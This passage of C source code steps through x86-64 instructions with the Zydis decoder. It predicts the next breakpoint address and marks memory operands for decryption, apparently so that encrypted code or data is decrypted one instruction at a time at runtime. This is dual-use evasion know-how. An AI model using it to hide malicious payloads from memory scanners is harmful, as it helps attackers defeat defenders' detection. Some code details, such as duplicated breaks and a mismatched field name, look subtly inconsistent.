         * - JRCXZ 0x1 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_JRCXZ:
            if (getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RCX) == 0) {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
            } else {
                lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            }

            break;

        /**
         * Loop; jump short (to start of loop) if counter (rcx) is not 0
         * 
         * - LOOP 0x5 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_LOOP:
            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_IMMEDIATE && zdInstruction->operand_count == 3) {
                uint64_t rcx = getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RCX);
                uint8_t* lpLoopTarget = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                lpCurrentBD->lpLastKnownNextBreakpointAddress = (rcx - 1) != 0 ? lpLoopTarget : lpCurrentAddress + zdInstruction->length;
            } else {
                PRINT_FAILURE_AND_ABORT("Invalid `loop` format. Operand count of %d and type of 0x%X.", zdInstruction->operand_count, zdFirstOperand.type);
            }

            break;

        /**
         * Loop while equal; jump short (to start of loop) if counter (rcx) is not 0 and ZF is 1
         * 
         * - LOOPE 0x5 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_LOOPE:
            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_IMMEDIATE && zdInstruction->operand_count == 3) {
                uint64_t rcx = getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RCX);
                bool zf = getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF);
                uint8_t* lpLoopTarget = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                lpCurrentBD->lpLastKnownNextBreakpointAddress = ((rcx - 1) != 0 && zf) ? lpLoopTarget : lpCurrentAddress + zdInstruction->length;
            } else {
                PRINT_FAILURE_AND_ABORT("Invalid `loope` format. Operand count of %d and type of 0x%X.", zdInstruction->operand_count, zdFirstOperand.type);
            }

            break;

        /**
         * Loop while not equal; jump short (to start of loop) if counter (rcx) is not 0 and ZF is 0
         * 
         * - LOOPNE 0x5 (short, likely within our bounds).
         * - Cannot be dynamic based on registry.
         */
        case ZYDIS_MNEMONIC_LOOPNE:
            if (zdFirstOperand.type == ZYDIS_OPERAND_TYPE_IMMEDIATE && zdInstruction->operand_count == 3) {
                uint64_t rcx = getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RCX);
                bool zf = getCpuFlagValue(lpContext, ZYDIS_CPUFLAG_ZF);
                uint8_t* lpLoopTarget = lpCurrentAddress + zdInstruction->length + zdFirstOperand.imm.value.s;
                lpCurrentBD->lpLastKnownNextBreakpointAddress = ((rcx - 1) != 0 && !zf) ? lpLoopTarget : lpCurrentAddress + zdInstruction->length;
            } else {
                PRINT_FAILURE_AND_ABORT("Invalid `loopne` format. Operand count of %d and type of 0x%X.", zdInstruction->operand_count, zdFirstOperand.type);
            }

            break;

        /**
         * Mov & SBB; all kinds that possibly move memory into a register
         * 
         * - MOV RAX, RBX (register to register)
         * - MOV RAX, 123 (immediate to register)
         * - MOV RAX, [RBX] (memory to register)
         * - MOV [RAX], RBX (register to memory)
         * - MOV [RAX], 123 (immediate to memory)
         * - SBB RAX, RBX (register to register)
         * - SBB RAX, 123 (immediate to register)
         * - SBB RAX, [RBX] (memory to register)
         * - SBB [RAX], RBX (register to memory)
         * - SBB [RAX], 123 (immediate to memory)
         * - Cannot move memory to memory
         */
        case ZYDIS_MNEMONIC_MOV:
        case ZYDIS_MNEMONIC_MOVSX:
        case ZYDIS_MNEMONIC_MOVSXD:
        case ZYDIS_MNEMONIC_MOVDQU:
        case ZYDIS_MNEMONIC_MOVAPD:
        case ZYDIS_MNEMONIC_MOVAPS:
        case ZYDIS_MNEMONIC_MOVBE:
        case ZYDIS_MNEMONIC_MOVD:
        case ZYDIS_MNEMONIC_MOVDDUP:
        case ZYDIS_MNEMONIC_MOVDIR64B:
        case ZYDIS_MNEMONIC_MOVDIRI:
        case ZYDIS_MNEMONIC_MOVDQ2Q:
        case ZYDIS_MNEMONIC_MOVDQA:
        case ZYDIS_MNEMONIC_MOVHLPS:
        case ZYDIS_MNEMONIC_MOVHPD:
        case ZYDIS_MNEMONIC_MOVHPS:
        case ZYDIS_MNEMONIC_MOVLHPS:
        case ZYDIS_MNEMONIC_MOVLPD:
        case ZYDIS_MNEMONIC_MOVLPS:
        case ZYDIS_MNEMONIC_MOVMSKPD:
        case ZYDIS_MNEMONIC_MOVMSKPS:
        case ZYDIS_MNEMONIC_MOVNTDQ:
        case ZYDIS_MNEMONIC_MOVNTDQA:
        case ZYDIS_MNEMONIC_MOVNTI:
        case ZYDIS_MNEMONIC_MOVNTPD:
        case ZYDIS_MNEMONIC_MOVNTPS:
        case ZYDIS_MNEMONIC_MOVNTQ:
        case ZYDIS_MNEMONIC_MOVNTSD:
        case ZYDIS_MNEMONIC_MOVNTSS:
        case ZYDIS_MNEMONIC_MOVQ:
        case ZYDIS_MNEMONIC_MOVQ2DQ:
        case ZYDIS_MNEMONIC_MOVSHDUP:
        case ZYDIS_MNEMONIC_MOVSLDUP:
        case ZYDIS_MNEMONIC_MOVSS:
        case ZYDIS_MNEMONIC_MOVUPD:
        case ZYDIS_MNEMONIC_MOVUPS:
        case ZYDIS_MNEMONIC_MOVZX:
        case ZYDIS_MNEMONIC_CMOVB:
        case ZYDIS_MNEMONIC_CMOVBE:
        case ZYDIS_MNEMONIC_CMOVL:
        case ZYDIS_MNEMONIC_CMOVLE:
        case ZYDIS_MNEMONIC_CMOVNB:
        case ZYDIS_MNEMONIC_CMOVNBE:
        case ZYDIS_MNEMONIC_CMOVNL:
        case ZYDIS_MNEMONIC_CMOVNLE:
        case ZYDIS_MNEMONIC_CMOVNO:
        case ZYDIS_MNEMONIC_CMOVNP:
        case ZYDIS_MNEMONIC_CMOVNS:
        case ZYDIS_MNEMONIC_CMOVNZ:
        case ZYDIS_MNEMONIC_CMOVO:
        case ZYDIS_MNEMONIC_CMOVP:
        case ZYDIS_MNEMONIC_CMOVS:
        case ZYDIS_MNEMONIC_CMOVZ:
        case ZYDIS_MNEMONIC_XCHG:
        case ZYDIS_MNEMONIC_SBB:
        case ZYDIS_MNEMONIC_IMUL:
        case ZYDIS_MNEMONIC_MUL:
        case ZYDIS_MNEMONIC_TEST:
        case ZYDIS_MNEMONIC_ROR:
        case ZYDIS_MNEMONIC_ROL:
        case ZYDIS_MNEMONIC_DEC:
        case ZYDIS_MNEMONIC_ADD:
        case ZYDIS_MNEMONIC_SUB:
        case ZYDIS_MNEMONIC_XOR:
        case ZYDIS_MNEMONIC_PXOR:
        case ZYDIS_MNEMONIC_XORPS:
        case ZYDIS_MNEMONIC_CMP:
        case ZYDIS_MNEMONIC_PUSH:
        case ZYDIS_MNEMONIC_AND:
        case ZYDIS_MNEMONIC_INC:
        case ZYDIS_MNEMONIC_OR:
        case ZYDIS_MNEMONIC_SAR:
        case ZYDIS_MNEMONIC_SHL:
        case ZYDIS_MNEMONIC_SHR:
        case ZYDIS_MNEMONIC_ADC:
        case ZYDIS_MNEMONIC_BT:
        case ZYDIS_MNEMONIC_BTS:

            // If comparing memory (or other memory read in first operand), and memory is inside bounds, decrypt it first
            if (zdOperands[0].type == ZYDIS_OPERAND_TYPE_MEMORY) {
                GetDereferencedMemory(zdOperands[0], lpException, &lpCurrentBD->sInstructionActions[0].lpAddress, &lpCurrentBD->sInstructionActions[0].dwSize);
                if (IsAddressWithinBounds(&lpPD, lpCurrentBD->sInstructionActions[0].lpAddress)) {
                    lpCurrentBD->sInstructionActions[0].eDesiredState = DESIRED_STATE_DECRYPTED;
                }
            }

            // If moving memory to register (or other memory read in second operand), and memory is inside bounds, decrypt it first
            if (zdOperands[1].type == ZYDIS_OPERAND_TYPE_MEMORY) {
                GetDereferencedMemory(zdOperands[1], lpException, &lpCurrentBD->sInstructionActions[1].lpAddress, &lpCurrentBD->sInstructionActions[1].dwSize);
                if (IsAddressWithinBounds(&lpPD, lpCurrentBD->sInstructionActions[1].lpAddress)) {
                    lpCurrentBD->sInstructionActions[1].eDesiredState = DESIRED_STATE_DECRYPTED;
                }
            }

            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;

            break;

        /**
         * Move Single Byte from [RSI] to [RDI]
         */
        case ZYDIS_MNEMONIC_MOVSB:

            lpCurrentBD->sInstructionActions[0].lpAddress = (uint8_t*) getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RSI);
            lpCurrentBD->sInstructionActions[0].dwSize = sizeof(uint8_t);
            lpCurrentBD->sInstructionActions[0].eDesiredState = DESIRED_STATE_DECRYPTED;
            
            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;

            break;
            break;

        /**
         * Move Single Word from [RSI] to [RDI]
         */
        case ZYDIS_MNEMONIC_MOVSW:

            lpCurrentBD->sInstructionActions[0].lpAddress = (uint8_t*) getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RSI);
            lpCurrentBD->sInstructionActions[0].dwSize = sizeof(uint16_t);
            lpCurrentBD->sInstructionActions[0].eDesiredState = DESIRED_STATE_DECRYPTED;
            
            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;

            break;
            break;

        /**
         * Move Double Word from [RSI] to [RDI]
         */
        case ZYDIS_MNEMONIC_MOVSD:

            lpCurrentBD->sInstructionActions[0].lpAddress = (uint8_t*) getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RSI);
            lpCurrentBD->sInstructionActions[0].dwSize = sizeof(uint32_t);
            lpCurrentBD->sInstructionActions[0].eDesiredState = DESIRED_STATE_DECRYPTED;
            
            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;

            break;

        /**
         * Move Quad Word from [RSI] to [RDI]
         */
        case ZYDIS_MNEMONIC_MOVSQ:

            lpCurrentBD->sInstructionActions[0].lpAddress = (uint8_t*) getCpuRegisterValue(lpContext, ZYDIS_REGISTER_RSI);
            lpCurrentBD->sInstructionActions[0].dwSize = sizeof(uint64_t);
            lpCurrentBD->sInstructionActions[0].eDesiredState = DESIRED_STATE_DECRYPTED;
            
            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;

            break;

        case ZYDIS_MNEMONIC_NOT:
        case ZYDIS_MNEMONIC_NEG:
        case ZYDIS_MNEMONIC_DIV:
            // If the operand is memory, decrypt it first
            if (zdOperands[0].type == ZYDIS_OPERAND_TYPE_MEMORY) {
                const char* mnemonic = ZydisMnemonicGetString(zdInstruction->mnemonic);
                PRINT_FAILURE_AND_ABORT("Instruction 0x%X (%s) with length %d and memory operand is not supported yet.", *lpCurrentAddress, mnemonic, zdInstruction->length);
            }

            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            break;

        /**
         * All others; do nothing.
         */
        case ZYDIS_MNEMONIC_LODSW:
        case ZYDIS_MNEMONIC_LODSB:
        case ZYDIS_MNEMONIC_POP:
        case ZYDIS_MNEMONIC_CLD:
        case ZYDIS_MNEMONIC_LEA:
        case ZYDIS_MNEMONIC_IN:
        case ZYDIS_MNEMONIC_INSB:
        case ZYDIS_MNEMONIC_INSD:
        case ZYDIS_MNEMONIC_INSW:
        case ZYDIS_MNEMONIC_OUT:
        case ZYDIS_MNEMONIC_OUTSB:
        case ZYDIS_MNEMONIC_OUTSD:
        case ZYDIS_MNEMONIC_OUTSW:
        case ZYDIS_MNEMONIC_STOSB:
        case ZYDIS_MNEMONIC_STOSD:
        case ZYDIS_MNEMONIC_STOSQ:
        case ZYDIS_MNEMONIC_STOSW:
        case ZYDIS_MNEMONIC_NOP:
        case ZYDIS_MNEMONIC_ENTER:
        case ZYDIS_MNEMONIC_SETNBE:
        case ZYDIS_MNEMONIC_HLT:
        case ZYDIS_MNEMONIC_SETZ:
        case ZYDIS_MNEMONIC_SETLE:
        case ZYDIS_MNEMONIC_SETNZ:
        case ZYDIS_MNEMONIC_LEAVE:
        case ZYDIS_MNEMONIC_CDQE:
            lpCurrentBD->lpLastKnownNextBreakpointAddress = lpCurrentAddress + zdInstruction->length;
            break;
        default: {
            const char* mnemonic = ZydisMnemonicGetString(zdInstruction->mnemonic);
            PRINT_FAILURE_AND_ABORT("Unknown instruction 0x%X (%s) with length %d.", *lpCurrentAddress, mnemonic, zdInstruction->length);
            break;
        }
    }

    // If next address is outside bounds, check if we need to decrypt any register values that are memory addresses inside our bounds.
    if (ShouldSetNextAddressOutsideBoundsActions(zdInstruction, zdOperands, lpException, lpCurrentAddress, lpCurrentBD->lpLastKnownNextAddress)) {
        SetNextAddressOutsideBoundsActions(zdInstruction, zdOperands, lpException, lpCurrentAddress);
    }
}
